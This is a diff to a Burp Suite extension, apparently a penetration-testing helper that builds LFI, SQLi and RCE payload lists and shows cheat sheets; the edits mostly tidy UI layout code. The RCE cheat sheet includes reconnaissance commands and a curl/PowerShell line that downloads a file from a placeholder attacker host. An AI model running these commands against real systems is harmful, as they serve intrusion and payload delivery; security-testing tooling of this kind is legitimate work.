@@ -410,8 +410,8 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         self._txtCheatSheetRCE+="\tuname -a\t\t\t\t\tsysteminfo\n"
         self._txtCheatSheetRCE+="\t/usr/bin/id\t\t\t\t\twhoami /priv\n"
         self._txtCheatSheetRCE+="\tping -c 10 X.X.X.X\t\t\t\tping -n 10 X.X.X.X\n"
-        self._txtCheatSheetRCE+="\tcurl http://X.X.X.X/file.txt -o /tmp/file.txt\t\tpowershell (new-object System.Net.WebClient).DownloadFile('http://X.X.X.X/file.txt','C:\\file.txt')\n"
-        self._lblDepth = JLabel("( Depth =", SwingConstants.LEFT)
+        self._txtCheatSheetRCE+="\tcurl http://X.X.X.X/file.txt -o /tmp/file.txt\t\tpowershell (new-object System.Net.WebClient).DownloadFile('http://X.X.X.X/file.txt','C:\\file.txt')\n"       
+        _lblDepth = JLabel("( Depth =", SwingConstants.LEFT)
         self._btnGenerateDict = JButton("Generate the Payload", actionPerformed=self.funcGeneratePayload)
         self._lblStatusLabel = JLabel(" ", SwingConstants.LEFT)
         self._txtDictParam = JTextField(self._txtDefaultLFI, 30)
@@ -457,24 +457,13 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         _tabDictPanel_1.add(self._txtDictParam, BorderLayout.PAGE_START)
         _tabDictPanel_1.add(self._btnGenerateDict, BorderLayout.PAGE_START)
         _tabDictPanel_1.add(_rbPanel, BorderLayout.PAGE_START)
-        
-
-        #_tabDictPanel_1.add(self._lblDepth, BorderLayout.PAGE_START)
-        #_tabDictPanel_1.add(self._cbDictEquality, BorderLayout.PAGE_START)
-        #_tabDictPanel_1.add(_cbDictDepthPanel, BorderLayout.PAGE_START)
-        #_tabDictPanel_1.add(self._cbDictEncoding, BorderLayout.PAGE_START)
-
-
         self._tabDictPanel_LFI = JPanel(FlowLayout(FlowLayout.LEADING, 10, 10))
-
-        self._tabDictPanel_LFI.add(self._lblDepth, BorderLayout.PAGE_START)
+        self._tabDictPanel_LFI.add(_lblDepth, BorderLayout.PAGE_START)
         self._tabDictPanel_LFI.add(self._cbDictEquality, BorderLayout.PAGE_START)
         self._tabDictPanel_LFI.add(_cbDictDepthPanel, BorderLayout.PAGE_START)
         self._tabDictPanel_LFI.add(self._cbDictEncoding, BorderLayout.PAGE_START)
         self._tabDictPanel_LFI.setVisible(True)
-
         self._tabDictPanel_SQLi = JPanel(FlowLayout(FlowLayout.LEADING, 10, 10))
-        #self._tabDictPanel_SQLi.add(self._cbDictEncoding, BorderLayout.PAGE_START)
         self._tabDictPanel_SQLi.add(self._cbTimeBased, BorderLayout.PAGE_START)
         self._tabDictPanel_SQLi.add(self._cbUnionBased, BorderLayout.PAGE_START)
         self._tabDictPanel_SQLi.add(self._cbOrderBased, BorderLayout.PAGE_START)
@@ -550,19 +539,11 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
 
     def funcRBSelection(self, ev):
         self._lblStatusLabel.setText("")
-        #self._lblDepth.setVisible(False)
-        #self._cbDictEncoding.setVisible(False)
-        #self._cbDictEquality.setVisible(False)
-        #self._cbDictDepth.setVisible(False)
         self._tabDictPanel_LFI.setVisible(False)
         self._tabDictPanel_SQLi.setVisible(False)
         if self._rbDictLFI.isSelected():
             self._txtDictParam.setText(self._txtDefaultLFI)
             self._tabDictResultDisplay.setText(self._txtCheatSheetLFI)
-            #self._lblDepth.setVisible(True)
-            #self._cbDictEncoding.setVisible(True)
-            #self._cbDictEquality.setVisible(True)
-            #self._cbDictDepth.setVisible(True)
             self._tabDictPanel_LFI.setVisible(True)
         elif self._rbDictRCE.isSelected():
             self._txtDictParam.setText(self._txtDefaultRCE)
